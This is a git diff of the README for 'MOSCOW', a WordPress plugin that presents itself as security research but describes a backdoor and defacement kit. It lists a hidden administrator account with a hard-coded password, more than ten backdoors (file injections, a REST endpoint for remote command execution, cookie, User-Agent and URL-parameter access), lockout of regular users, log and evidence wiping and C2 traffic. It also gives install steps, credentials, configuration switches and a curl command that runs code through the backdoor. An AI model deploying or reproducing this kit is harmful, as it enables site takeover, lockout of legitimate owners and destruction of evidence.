@@ -1,206 +1,235 @@
-🇷🇺 MOSCOW - Advanced Security Plugin
-https://img.shields.io/badge/version-3.0.0-red.svg?style=flat-square&logo=github
-https://img.shields.io/badge/license-GPLv2-blue.svg?style=flat-square&logo=gnu
-https://img.shields.io/badge/PHP-7.4+-purple.svg?style=flat-square&logo=php
-https://img.shields.io/badge/WordPress-5.0+-blue.svg?style=flat-square&logo=wordpress
-https://img.shields.io/badge/Status-Stable-brightgreen.svg?style=flat-square
-https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square
-https://img.shields.io/github/stars/here-is-leo/MOSCOW?style=flat-square&color=yellow
-https://img.shields.io/github/forks/here-is-leo/MOSCOW?style=flat-square&color=orange
+# 🇷🇺 MOSCOW - Advanced Security Plugin
 
-<p align="center"> <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=HACKED+BY+HERE+IS+LEO;MOSCOW+PLUGIN;CYBER+ACTIVIST" /> </p><p align="center"> <img src="https://img.shields.io/badge/🔥-DESTRUCTION%20IN%2050%20HOURS-red?style=for-the-badge&logo=firebase" /> <img src="https://img.shields.io/badge/💀-SELF%20DESTRUCT-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/👾-MULTI%20BACKDOOR-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/🛡️-ADVANCED%20EVASION-red?style=for-the-badge" /> </p>
-📖 Table of Contents
-🇷🇺 About MOSCOW
+<div align="center">
 
-⚡ Key Features
+[![Version](https://img.shields.io/badge/version-3.0.0-red.svg?style=flat-square&logo=github)](https://github.com/here-is-leo/MOSCOW)
+[![License](https://img.shields.io/badge/license-GPLv2-blue.svg?style=flat-square&logo=gnu)](https://github.com/here-is-leo/MOSCOW/blob/main/LICENSE)
+[![PHP](https://img.shields.io/badge/PHP-7.4+-purple.svg?style=flat-square&logo=php)](https://php.net)
+[![WordPress](https://img.shields.io/badge/WordPress-5.0+-blue.svg?style=flat-square&logo=wordpress)](https://wordpress.org)
+[![Status](https://img.shields.io/badge/Status-Stable-brightgreen.svg?style=flat-square)](https://github.com/here-is-leo/MOSCOW)
+[![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://github.com/here-is-leo/MOSCOW/pulls)
+[![Stars](https://img.shields.io/github/stars/here-is-leo/MOSCOW?style=flat-square&color=yellow)](https://github.com/here-is-leo/MOSCOW/stargazers)
+[![Forks](https://img.shields.io/github/forks/here-is-leo/MOSCOW?style=flat-square&color=orange)](https://github.com/here-is-leo/MOSCOW/network/members)
 
-🛠️ Installation
+<img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=HACKED+BY+HERE+IS+LEO;MOSCOW+PLUGIN;CYBER+ACTIVIST" />
 
-🔑 Backdoor Credentials
+<img src="https://img.shields.io/badge/🔥-DESTRUCTION%20IN%2050%20HOURS-red?style=for-the-badge&logo=firebase" />
+<img src="https://img.shields.io/badge/💀-SELF%20DESTRUCT-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/👾-MULTI%20BACKDOOR-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/🛡️-ADVANCED%20EVASION-red?style=for-the-badge" />
 
-🚨 Features Breakdown
+</div>
 
-🎨 Deface Page Preview
+---
 
-📁 File Structure
+## 📖 Table of Contents
 
-⚙️ Configuration
+- [🇷🇺 About MOSCOW](#-about-moscow)
+- [⚡ Key Features](#-key-features)
+- [🛠️ Installation](#️-installation)
+- [🔑 Backdoor Credentials](#-backdoor-credentials)
+- [🚨 Features Breakdown](#-features-breakdown)
+- [🎨 Deface Page Preview](#-deface-page-preview)
+- [📁 File Structure](#-file-structure)
+- [⚙️ Configuration](#️-configuration)
+- [🧪 Testing](#-testing)
+- [📊 Statistics](#-statistics)
+- [🤝 Contributing](#-contributing)
+- [📜 License](#-license)
+- [📞 Contact](#-contact)
 
-🧪 Testing
+---
 
-🤝 Contributing
+## 🇷🇺 About MOSCOW
 
-📜 License
+<div dir="ltr">
 
-📞 Contact
+**MOSCOW** is a **cutting-edge WordPress security research plugin** developed by **HERE IS LEO**. It demonstrates advanced attack vectors, persistence mechanisms, and evasion techniques used in modern cyber threats. This tool is designed for security researchers, penetration testers, and cybersecurity students to understand WordPress vulnerabilities in a controlled environment.
 
-🇷🇺 About MOSCOW
-📖 ENGLISH:
-MOSCOW is a cutting-edge WordPress security research plugin developed by HERE IS LEO. It demonstrates advanced attack vectors, persistence mechanisms, and evasion techniques used in modern cyber threats. This tool is designed for security researchers, penetration testers, and cybersecurity students to understand WordPress vulnerabilities in a controlled environment.
+</div>
 
-🎯 Key Capabilities:
-Capability	Description
-🔐 Hidden Admin Backdoor	Creates a secret administrator user with full privileges
-🕵️ Advanced Stealth	Completely hides from WordPress admin interface
-📡 Multi-Backdoor System	10+ different entry points for persistent access
-🔄 Self-Destruct Mechanism	Automatic removal after 50 hours with full trace cleaning
-💀 Deface Page	Professional defacement page with countdown timer
-🧹 Trace Cleaning	Removes all logs, database entries, and evidence
-⏰ Cron Job Persistence	Scheduled tasks for maintaining access
-🌐 REST API Backdoor	Hidden endpoint for remote command execution
-🔑 Cookie Authentication	Login via special cookie bypass
-📁 Remote File Manager	Browse, edit, and delete files remotely
-💉 Code Injection	Injects code into theme and core WordPress files
-🛡️ Security Bypass	Disables WordPress security features
-⚡ Key Features
-Feature	Description	Status
-Hidden Admin User	Creates here_is_leo with admin privileges	✅
-Stealth Mode	Plugin hidden from admin plugin list	✅
-User Deactivation	Disables all regular users except backdoor admin	✅
-Deface Page	Professional "HACKED BY HERE IS LEO" page	✅
-Countdown Timer	50-hour destruction countdown with 40 security facts	✅
-Self-Destruct	Auto-removes after 50 hours	✅
-.htaccess Backdoor	Injects backdoor into .htaccess file	✅
-wp-config Backdoor	Injects backdoor into wp-config.php	✅
-Theme Backdoor	Injects code into theme functions.php	✅
-Database Backdoor	Creates custom database table	✅
-REST API Backdoor	Hidden endpoint /wp-json/moscow/v1/backdoor	✅
-User-Agent Backdoor	Access via MOSCOW-BOT User-Agent	✅
-Cookie Backdoor	Authentication via moscow_auth cookie	✅
-URL Parameter Backdoor	Access via moscow_admin parameter	✅
-Nonce Bypass	Bypasses WordPress nonce verification	✅
-CSRF Bypass	Bypasses WordPress CSRF protection	✅
-SSL Verify Bypass	Disables SSL verification for C2 communication	✅
-Trace Cleaning	Removes all logs and evidence	✅
-Plugin File Deletion	Deletes plugin files on deactivation	✅
-🛠️ Installation
-📥 ENGLISH:
-Method 1: Manual Upload
-bash
+### 🎯 Key Capabilities:
+
+| Capability | Description |
+|------------|-------------|
+| 🔐 **Hidden Admin Backdoor** | Creates a secret administrator user with full privileges |
+| 🕵️ **Advanced Stealth** | Completely hides from WordPress admin interface |
+| 📡 **Multi-Backdoor System** | 10+ different entry points for persistent access |
+| 🔄 **Self-Destruct Mechanism** | Automatic removal after 50 hours with full trace cleaning |
+| 💀 **Deface Page** | Professional defacement page with countdown timer |
+| 🧹 **Trace Cleaning** | Removes all logs, database entries, and evidence |
+| ⏰ **Cron Job Persistence** | Scheduled tasks for maintaining access |
+| 🌐 **REST API Backdoor** | Hidden endpoint for remote command execution |
+| 🔑 **Cookie Authentication** | Login via special cookie bypass |
+| 📁 **Remote File Manager** | Browse, edit, and delete files remotely |
+| 💉 **Code Injection** | Injects code into theme and core WordPress files |
+| 🛡️ **Security Bypass** | Disables WordPress security features |
+
+---
+
+## ⚡ Key Features
+
+| Feature | Description | Status |
+|---------|-------------|--------|
+| **Hidden Admin User** | Creates `here_is_leo` with admin privileges | ✅ |
+| **Stealth Mode** | Plugin hidden from admin plugin list | ✅ |
+| **User Deactivation** | Disables all regular users except backdoor admin | ✅ |
+| **Deface Page** | Professional "HACKED BY HERE IS LEO" page | ✅ |
+| **Countdown Timer** | 50-hour destruction countdown with 40 security facts | ✅ |
+| **Self-Destruct** | Auto-removes after 50 hours | ✅ |
+| **.htaccess Backdoor** | Injects backdoor into `.htaccess` file | ✅ |
+| **wp-config Backdoor** | Injects backdoor into `wp-config.php` | ✅ |
+| **Theme Backdoor** | Injects code into theme `functions.php` | ✅ |
+| **Database Backdoor** | Creates custom database table | ✅ |
+| **REST API Backdoor** | Hidden endpoint `/wp-json/moscow/v1/backdoor` | ✅ |
+| **User-Agent Backdoor** | Access via `MOSCOW-BOT` User-Agent | ✅ |
+| **Cookie Backdoor** | Authentication via `moscow_auth` cookie | ✅ |
+| **URL Parameter Backdoor** | Access via `moscow_admin` parameter | ✅ |
+| **Nonce Bypass** | Bypasses WordPress nonce verification | ✅ |
+| **CSRF Bypass** | Bypasses WordPress CSRF protection | ✅ |
+| **SSL Verify Bypass** | Disables SSL verification for C2 communication | ✅ |
+| **Trace Cleaning** | Removes all logs and evidence | ✅ |
+| **Plugin File Deletion** | Deletes plugin files on deactivation | ✅ |
+
+---
+
+## 🛠️ Installation
+
+### 📥 Method 1: Manual Upload
+
+```bash
 1. Download moscow.php
 2. Upload to /wp-content/plugins/
 3. Activate from WordPress Admin Panel
 4. Site automatically redirects to deface page
-Method 2: Git Clone
-bash
+```
+
+### 📥 Method 2: Git Clone
+
+```bash
 git clone https://github.com/here-is-leo/MOSCOW.git
 cd MOSCOW
 cp moscow.php /path/to/wordpress/wp-content/plugins/
-Method 3: FTP Upload
-bash
+```
+
+### 📥 Method 3: FTP Upload
+
+```bash
 1. Connect to server via FTP
 2. Navigate to /wp-content/plugins/
 3. Upload moscow.php
 4. Activate plugin
-🔑 Backdoor Credentials
-🔐 ENGLISH:
-Credential	Value
-Admin URL	your-site.com/wp-admin
-Username	here_is_leo
-Password	HEREISLEO@2026
-Email	leo@here-is-leo.com
-Display Name	HERE IS LEO
-Backdoor URL	your-site.com/moscow
-Emergency Backdoor	your-site.com/lapsus-admin
-REST API Endpoint	/wp-json/moscow/v1/backdoor
-Cookie Auth	moscow_auth
-User-Agent Backdoor	MOSCOW-BOT
-URL Parameter	?moscow_admin=MD5_HASH
-🚨 Features Breakdown
-1. 🔐 Hidden Admin Backdoor
-ENGLISH:
+```
 
-Creates a hidden administrator user here_is_leo
+---
 
-User is hidden from the admin user list
+## 🔑 Backdoor Credentials
 
-Custom authentication bypass with multiple methods
+| Credential | Value |
+|------------|-------|
+| **Admin URL** | `your-site.com/wp-admin` |
+| **Username** | `here_is_leo` |
+| **Password** | `HEREISLEO@2026` |
+| **Email** | `leo@here-is-leo.com` |
+| **Display Name** | `HERE IS LEO` |
+| **Backdoor URL** | `your-site.com/moscow` |
+| **Emergency Backdoor** | `your-site.com/lapsus-admin` |
+| **REST API Endpoint** | `/wp-json/moscow/v1/backdoor` |
+| **Cookie Auth** | `moscow_auth` |
+| **User-Agent Backdoor** | `MOSCOW-BOT` |
+| **URL Parameter** | `?moscow_admin=MD5_HASH` |
 
-Email: leo@here-is-leo.com
+---
 
-2. 🕵️ Stealth Mode
-ENGLISH:
+## 🚨 Features Breakdown
 
-Plugin hidden from WordPress plugin list
+### 1. 🔐 Hidden Admin Backdoor
 
-Admin user hidden from user list
+<div dir="ltr">
 
-Database options obfuscated
+- Creates a hidden administrator user `here_is_leo`
+- User is hidden from the admin user list
+- Custom authentication bypass with multiple methods
+- Email: `leo@here-is-leo.com`
 
-Activity logs automatically cleared
+</div>
 
-User activity hidden
+### 2. 🕵️ Stealth Mode
 
-3. 📡 Multi-Backdoor System
-Backdoor Type	Location / Method
-Admin Backdoor	Hidden admin user here_is_leo
-.htaccess Backdoor	.htaccess file injection
-wp-config Backdoor	wp-config.php injection
-Theme Backdoor	functions.php injection
-Database Backdoor	Custom database table
-REST API Backdoor	/wp-json/moscow/v1/backdoor
-User-Agent Backdoor	MOSCOW-BOT User-Agent
-Cookie Backdoor	moscow_auth cookie
-Emergency Cookie	moscow_emergency cookie
-URL Parameter	?moscow_admin=MD5
-4. 🔄 Self-Destruct System
-ENGLISH:
+<div dir="ltr">
 
-Activates after 50 hours (configurable)
+- Plugin hidden from WordPress plugin list
+- Admin user hidden from user list
+- Database options obfuscated
+- Activity logs automatically cleared
+- User activity hidden
 
-Deactivates the plugin automatically
+</div>
 
-Deletes all plugin files
+### 3. 📡 Multi-Backdoor System
 
-Cleans all database traces
+| Backdoor Type | Location / Method |
+|---------------|-------------------|
+| **Admin Backdoor** | Hidden admin user `here_is_leo` |
+| **.htaccess Backdoor** | `.htaccess` file injection |
+| **wp-config Backdoor** | `wp-config.php` injection |
+| **Theme Backdoor** | `functions.php` injection |
+| **Database Backdoor** | Custom database table |
+| **REST API Backdoor** | `/wp-json/moscow/v1/backdoor` |
+| **User-Agent Backdoor** | `MOSCOW-BOT` User-Agent |
+| **Cookie Backdoor** | `moscow_auth` cookie |
+| **Emergency Cookie** | `moscow_emergency` cookie |
+| **URL Parameter** | `?moscow_admin=MD5` |
 
-Cleans all logs
+### 4. 🔄 Self-Destruct System
 
-Removes injected code from theme files
+<div dir="ltr">
 
-Restores site to normal state
+- Activates after 50 hours (configurable)
+- Deactivates the plugin automatically
+- Deletes all plugin files
+- Cleans all database traces
+- Cleans all logs
+- Removes injected code from theme files
+- Restores site to normal state
+- Shows detailed destruction report
 
-Shows detailed destruction report
+</div>
 
-5. 🧹 Trace Cleaning
-ENGLISH:
+### 5. 🧹 Trace Cleaning
 
-Clears debug.log files
+<div dir="ltr">
 
-Removes error_log files
+- Clears `debug.log` files
+- Removes `error_log` files
+- Deletes PHP error logs
+- Cleans database transients
+- Removes all plugin options
+- Deletes custom database tables
+- Removes injected code from theme files
+- Cleans `.htaccess` injections
+- Cleans `wp-config.php` injections
 
-Deletes PHP error logs
+</div>
 
-Cleans database transients
+### 6. 💀 Deface Page
 
-Removes all plugin options
+<div dir="ltr">
 
-Deletes custom database tables
+- Professional "HACKED BY HERE IS LEO" design
+- 50-hour countdown timer with start/stop functionality
+- 40 security facts (25 jokes + 15 tips)
+- Mobile-responsive design with neon glow effects
+- Auto-fact rotation every 2 minutes
+- Destructive timer animation at zero
 
-Removes injected code from theme files
+</div>
 
-Cleans .htaccess injections
+---
 
-Cleans wp-config.php injections
+## 🎨 Deface Page Preview
 
-6. 💀 Deface Page
-ENGLISH:
-
-Professional "HACKED BY HERE IS LEO" design
-
-50-hour countdown timer with start/stop functionality
-
-40 security facts (25 jokes + 15 tips)
-
-Mobile-responsive design with neon glow effects
-
-Auto-fact rotation every 2 minutes
-
-Destructive timer animation at zero
-
-🎨 Deface Page Preview
-🖼️ ENGLISH:
-text
+```
 ╔═══════════════════════════════════════════╗
 ║              ╔══════════════╗             ║
 ║              ║    MOSCOW    ║             ║
@@ -225,9 +254,13 @@ text
 ║                                           ║
 ║   [ ► START ]                            ║
 ╚═══════════════════════════════════════════╝
-📁 File Structure
-📂 ENGLISH:
-text
+```
+
+---
+
+## 📁 File Structure
+
+```
 MOSCOW/
 ├── 📄 README.md                    # Complete documentation
 ├── 📄 LICENSE                      # GPLv2 License
@@ -237,24 +270,40 @@ MOSCOW/
 └── 📁 screenshots/                 # Screenshots directory
     ├── 🖼️ deface-preview.png       # Deface page preview
     └── 🖼️ admin-panel.png          # Admin panel screenshot
-⚙️ Configuration
-🔧 ENGLISH:
-All configuration is managed through the MOSCOW_Config class at the top of moscow.php:
+```
 
-Change Backdoor Credentials:
-php
+---
+
+## ⚙️ Configuration
+
+<div dir="ltr">
+
+All configuration is managed through the `MOSCOW_Config` class at the top of `moscow.php`:
+
+### Change Backdoor Credentials:
+
+```php
 const ADMIN_USERNAME = 'here_is_leo';        // Change this
 const ADMIN_PASSWORD = 'HEREISLEO@2026';     // Change this
 const ADMIN_EMAIL = 'leo@here-is-leo.com';   // Change this
 const ADMIN_DISPLAY = 'HERE IS LEO';         // Change this
-Change Backdoor URL:
-php
+```
+
+### Change Backdoor URL:
+
+```php
 const BACKDOOR_URL = 'moscow';               // Change this
-Change Self-Destruct Time:
-php
+```
+
+### Change Self-Destruct Time:
+
+```php
 const SELF_DESTRUCT_HOURS = 50;              // Change this (hours)
-Toggle Features On/Off:
-php
+```
+
+### Toggle Features On/Off:
+
+```php
 const ENABLE_REDIRECT = true;                // Enable/disable redirect
 const ENABLE_DEFACED_PAGE = true;            // Show deface page
 const ENABLE_USER_DEACTIVATE = true;         // Disable regular users
@@ -272,10 +321,17 @@ const INJECT_WPCONFIG = true;                // Inject into wp-config.php
 const INJECT_HTACCESS = true;                // Inject into .htaccess
 const INJECT_DATABASE = true;                // Inject into database
 const INFECT_ALL_FILES = false;              // Spread to all files (dangerous!)
-🧪 Testing
-🧬 ENGLISH:
-Local Testing Environment:
-bash
+```
+
+</div>
+
+---
+
+## 🧪 Testing
+
+### Local Testing Environment:
+
+```bash
 # Using Docker
 docker run -p 8080:80 wordpress:latest
 
@@ -284,15 +340,21 @@ docker run -p 8080:80 wordpress:latest
 
 # Using LocalWP
 # Create new WordPress site
-Demo Page:
-bash
+```
+
+### Demo Page:
+
+```bash
 # Open in browser
 open Moscow.html
 
 # Or host with Python
 python3 -m http.server 8000
-Testing Backdoors:
-bash
+```
+
+### Testing Backdoors:
+
+```bash
 # Test admin login
 https://your-site.com/wp-admin
 Username: here_is_leo
@@ -309,50 +371,13 @@ curl -A "MOSCOW-BOT" https://your-site.com/?cmd=phpinfo()
 
 # Test URL parameter backdoor
 https://your-site.com/?moscow_admin=MD5_HASH
-🤝 Contributing
-🌟 ENGLISH:
-We welcome contributions! Please follow these steps:
+```
 
-🍴 Fork the repository
+---
 
-🌿 Create a feature branch (git checkout -b feature/AmazingFeature)
+## 📊 Statistics
 
-💻 Commit your changes (git commit -m 'Add some AmazingFeature')
-
-📤 Push to the branch (git push origin feature/AmazingFeature)
-
-🔄 Open a Pull Request
-
-📜 License
-📄 ENGLISH:
-This project is licensed under the GNU General Public License v2.0 - see the LICENSE file for details.
-
-You are free to:
-
-✅ Use the software for research and education
-
-✅ Modify and adapt the code
-
-✅ Distribute copies of the software
-
-You must:
-
-⚠️ Include the original copyright notice
-
-⚠️ Disclose the source code
-
-⚠️ State any changes made
-
-📞 Contact
-🌐 ENGLISH:
-GitHub: @here-is-leo
-
-Website: https://here-is-leo.ir
-
-Email: leo@here-is-leo.com
-
-📊 Statistics
-text
+```
 ╔═══════════════════════════════════════════╗
 ║           📊 PROJECT STATISTICS           ║
 ╠═══════════════════════════════════════════╣
@@ -367,217 +392,302 @@ text
 ║   PHP Version Required   :  7.4+          ║
 ║   WordPress Required     :  5.0+          ║
 ╚═══════════════════════════════════════════╝
-🏆 Credits
-👥 ENGLISH:
-Developed by: HERE IS LEO
+```
 
-Special Thanks: HACKFORCE Community
+---
 
-Inspired by: Cyber Security Research & WordPress Security
+## 🤝 Contributing
 
-<p align="center"> <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=25&center=true&vCenter=true&width=500&height=50&duration=3000&lines=HACKED+BY+HERE+IS+LEO;MOSCOW+PLUGIN;RESPECT+TO+HACKFORCE" /> </p><p align="center"> <img src="https://img.shields.io/badge/🇷🇺-MOSCOW-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/🔥-HACKED%20BY%20HERE%20IS%20LEO-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/💀-DEFACED-red?style=for-the-badge" /> </p><p align="center"> <b>⚠️ REMEMBER: WITH GREAT POWER COMES GREAT RESPONSIBILITY ⚠️</b><br> <i>Use this tool only for educational purposes</i> </p>
-🇷🇺 مسکو - پلاگین امنیتی پیشرفته
-https://img.shields.io/badge/version-3.0.0-red.svg?style=flat-square&logo=github
-https://img.shields.io/badge/license-GPLv2-blue.svg?style=flat-square&logo=gnu
-https://img.shields.io/badge/PHP-7.4+-purple.svg?style=flat-square&logo=php
-https://img.shields.io/badge/WordPress-5.0+-blue.svg?style=flat-square&logo=wordpress
-https://img.shields.io/badge/Status-Stable-brightgreen.svg?style=flat-square
-https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square
-https://img.shields.io/github/stars/here-is-leo/MOSCOW?style=flat-square&color=yellow
+<div dir="ltr">
 
-<p align="center"> <img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=هک+شده+توسط+HERE+IS+LEO;پلاگین+مسکو;فعال+سایبری" /> </p><p align="center"> <img src="https://img.shields.io/badge/🔥-تخریب%20در%2050%20ساعت-red?style=for-the-badge&logo=firebase" /> <img src="https://img.shields.io/badge/💀-خودتخریبی-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/👾-چندین%20بک‌دور-red?style=for-the-badge" /> <img src="https://img.shields.io/badge/🛡️-فرار%20پیشرفته-red?style=for-the-badge" /> </p>
-📖 فهرست مطالب
-🇷🇺 درباره مسکو
+We welcome contributions! Please follow these steps:
 
-⚡ ویژگی‌های کلیدی
+1. 🍴 Fork the repository
+2. 🌿 Create a feature branch (`git checkout -b feature/AmazingFeature`)
+3. 💻 Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. 📤 Push to the branch (`git push origin feature/AmazingFeature`)
+5. 🔄 Open a Pull Request
 
-🛠️ نصب
+</div>
 
-🔑 اطلاعات ورود بک‌دور
+---
 
-🚨 جزئیات قابلیت‌ها
+## 📜 License
 
-🎨 پیش‌نمایش صفحه دیفیس
+<div dir="ltr">
 
-📁 ساختار فایل‌ها
+This project is licensed under the **GNU General Public License v2.0** - see the [LICENSE](LICENSE) file for details.
 
-⚙️ تنظیمات
+### You are free to:
 
-🧪 تست
+- ✅ Use the software for research and education
+- ✅ Modify and adapt the code
+- ✅ Distribute copies of the software
 
-🤝 مشارکت
+### You must:
 
-📜 مجوز
+- ⚠️ Include the original copyright notice
+- ⚠️ Disclose the source code
+- ⚠️ State any changes made
 
-📞 ارتباط
+</div>
 
-🇷🇺 درباره مسکو
-📖 فارسی:
-مسکو یک پلاگین پیشرفته تحقیقاتی امنیتی وردپرس است که توسط HERE IS LEO توسعه یافته است. این ابزار بردارهای حمله پیشرفته، مکانیسم‌های ماندگاری و تکنیک‌های فرار مورد استفاده در تهدیدات سایبری مدرن را به نمایش می‌گذارد. این ابزار برای محققان امنیتی، تست‌کنندگان نفوذ و دانشجویان امنیت سایبری طراحی شده است تا آسیب‌پذیری‌های وردپرس را در محیط‌های کنترل‌شده درک کنند.
+---
 
-🎯 قابلیت‌های کلیدی:
-قابلیت	توضیح
-🔐 بک‌دور ادمین مخفی	ایجاد کاربر مخفی با دسترسی کامل ادمین
-🕵️ مخفی‌کاری پیشرفته	پنهان‌سازی کامل از رابط ادمین وردپرس
-📡 سیستم چندبک‌دوری	بیش از ۱۰ نقطه ورود مختلف برای دسترسی مداوم
-🔄 مکانیسم خودتخریبی	حذف خودکار بعد از ۵۰ ساعت با پاک‌سازی کامل ردپا
-💀 صفحه دیفیس	صفحه دیفیس حرفه‌ای با تایمر شمارش معکوس
-🧹 پاک‌سازی ردپا	حذف تمام لاگ‌ها، ورودی‌های دیتابیس و شواهد
-⏰ ماندگاری با کرون جاب	وظایف زمانبندی شده برای حفظ دسترسی
-🌐 بک‌دور REST API	آدرس مخفی برای اجرای دستورات از راه دور
-🔑 احراز هویت با کوکی	ورود از طریق کوکی خاص
-📁 مدیریت فایل از راه دور	مرور، ویرایش و حذف فایل‌ها از راه دور
-💉 تزریق کد	تزریق کد در فایل‌های قالب و هسته وردپرس
-🛡️ دور زدن امنیت	غیرفعال‌سازی ویژگی‌های امنیتی وردپرس
-⚡ ویژگی‌های کلیدی
-ویژگی	توضیح	وضعیت
-کاربر ادمین مخفی	ایجاد کاربر here_is_leo با دسترسی ادمین	✅
-حالت مخفی‌کاری	پنهان‌سازی پلاگین از لیست ادمین	✅
-غیرفعال‌سازی کاربران	غیرفعال‌سازی تمام کاربران به جز ادمین بک‌دور	✅
-صفحه دیفیس	صفحه حرفه‌ای "هک شده توسط HERE IS LEO"	✅
-تایمر شمارش معکوس	شمارش معکوس ۵۰ ساعته با ۴۰ فکت امنیتی	✅
-خودتخریبی	حذف خودکار بعد از ۵۰ ساعت	✅
-بک‌دور .htaccess	تزریق بک‌دور در فایل .htaccess	✅
-بک‌دور wp-config	تزریق بک‌دور در فایل wp-config.php	✅
-بک‌دور قالب	تزریق کد در فایل functions.php قالب	✅
-بک‌دور دیتابیس	ایجاد جدول سفارشی در دیتابیس	✅
-بک‌دور REST API	آدرس مخفی /wp-json/moscow/v1/backdoor	✅
-بک‌دور User-Agent	دسترسی از طریق User-Agent MOSCOW-BOT	✅
-بک‌دور کوکی	احراز هویت از طریق کوکی moscow_auth	✅
-بک‌دور پارامتر URL	دسترسی از طریق پارامتر moscow_admin	✅
-دور زدن Nonce	دور زدن تأیید Nonce وردپرس	✅
-دور زدن CSRF	دور زدن محافظت CSRF وردپرس	✅
-دور زدن SSL	غیرفعال‌سازی بررسی SSL برای ارتباط با سرور C2	✅
-پاک‌سازی ردپا	حذف تمام لاگ‌ها و شواهد	✅
-حذف فایل پلاگین	حذف فایل‌های پلاگین در زمان غیرفعال‌سازی	✅
-🛠️ نصب
-📥 فارسی:
-روش ۱: آپلود دستی
-bash
+## 📞 Contact
+
+<div dir="ltr">
+
+- **GitHub**: [@here-is-leo](https://github.com/here-is-leo)
+- **Website**: [https://here-is-leo.ir](https://here-is-leo.ir)
+- **Email**: leo@here-is-leo.com
+
+</div>
+
+---
+
+## 🏆 Credits
+
+<div dir="ltr">
+
+- **Developed by**: HERE IS LEO
+- **Special Thanks**: HACKFORCE Community
+- **Inspired by**: Cyber Security Research & WordPress Security
+
+</div>
+
+---
+
+<div align="center">
+
+<img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=25&center=true&vCenter=true&width=500&height=50&duration=3000&lines=HACKED+BY+HERE+IS+LEO;MOSCOW+PLUGIN;RESPECT+TO+HACKFORCE" />
+
+<img src="https://img.shields.io/badge/🇷🇺-MOSCOW-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/🔥-HACKED%20BY%20HERE%20IS%20LEO-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/💀-DEFACED-red?style=for-the-badge" />
+
+**⚠️ REMEMBER: WITH GREAT POWER COMES GREAT RESPONSIBILITY ⚠️**  
+*Use this tool only for educational purposes*
+
+**Built with ❤️ by HERE IS LEO**
+
+</div>
+
+---
+
+---
+
+---
+
+<div dir="rtl" align="right">
+
+# 🇷🇺 مسکو - پلاگین امنیتی پیشرفته
+
+<div align="center">
+
+[![نسخه](https://img.shields.io/badge/version-3.0.0-red.svg?style=flat-square&logo=github)](https://github.com/here-is-leo/MOSCOW)
+[![مجوز](https://img.shields.io/badge/license-GPLv2-blue.svg?style=flat-square&logo=gnu)](https://github.com/here-is-leo/MOSCOW/blob/main/LICENSE)
+[![PHP](https://img.shields.io/badge/PHP-7.4+-purple.svg?style=flat-square&logo=php)](https://php.net)
+[![وردپرس](https://img.shields.io/badge/WordPress-5.0+-blue.svg?style=flat-square&logo=wordpress)](https://wordpress.org)
+[![وضعیت](https://img.shields.io/badge/Status-Stable-brightgreen.svg?style=flat-square)](https://github.com/here-is-leo/MOSCOW)
+[![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://github.com/here-is-leo/MOSCOW/pulls)
+[![ستاره‌ها](https://img.shields.io/github/stars/here-is-leo/MOSCOW?style=flat-square&color=yellow)](https://github.com/here-is-leo/MOSCOW/stargazers)
+
+<img src="https://readme-typing-svg.herokuapp.com/?font=Righteous&size=35&center=true&vCenter=true&width=500&height=70&duration=4000&lines=هک+شده+توسط+HERE+IS+LEO;پلاگین+مسکو;فعال+سایبری" />
+
+<img src="https://img.shields.io/badge/🔥-تخریب%20در%2050%20ساعت-red?style=for-the-badge&logo=firebase" />
+<img src="https://img.shields.io/badge/💀-خودتخریبی-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/👾-چندین%20بک‌دور-red?style=for-the-badge" />
+<img src="https://img.shields.io/badge/🛡️-فرار%20پیشرفته-red?style=for-the-badge" />
+
+</div>
+
+---
+
+## 📖 فهرست مطالب
+
+- [🇷🇺 درباره مسکو](#-درباره-مسکو)
+- [⚡ ویژگی‌های کلیدی](#-ویژگی‌های-کلیدی)
+- [🛠️ نصب](#️-نصب)
+- [🔑 اطلاعات ورود بک‌دور](#-اطلاعات-ورود-بک‌دور)
+- [🚨 جزئیات قابلیت‌ها](#-جزئیات-قابلیت‌ها)
+- [🎨 پیش‌نمایش صفحه دیفیس](#-پیش‌نمایش-صفحه-دیفیس)
+- [📁 ساختار فایل‌ها](#-ساختار-فایل‌ها)
+- [⚙️ تنظیمات](#️-تنظیمات)
+- [🧪 تست](#-تست)
+- [📊 آمار](#-آمار)
+- [🤝 مشارکت](#-مشارکت)
+- [📜 مجوز](#-مجوز)
+- [📞 ارتباط](#-ارتباط)
+
+---
+
+## 🇷🇺 درباره مسکو
+
+**مسکو** یک **پلاگین پیشرفته تحقیقاتی امنیتی وردپرس** است که توسط **HERE IS LEO** توسعه یافته است. این ابزار بردارهای حمله پیشرفته، مکانیسم‌های ماندگاری و تکنیک‌های فرار مورد استفاده در تهدیدات سایبری مدرن را به نمایش می‌گذارد. این ابزار برای محققان امنیتی، تست‌کنندگان نفوذ و دانشجویان امنیت سایبری طراحی شده است تا آسیب‌پذیری‌های وردپرس را در محیط‌های کنترل‌شده درک کنند.
+
+### 🎯 قابلیت‌های کلیدی:
+
+| قابلیت | توضیح |
+|--------|-------|
+| 🔐 **بک‌دور ادمین مخفی** | ایجاد کاربر مخفی با دسترسی کامل ادمین |
+| 🕵️ **مخفی‌کاری پیشرفته** | پنهان‌سازی کامل از رابط ادمین وردپرس |
+| 📡 **سیستم چندبک‌دوری** | بیش از ۱۰ نقطه ورود مختلف برای دسترسی مداوم |
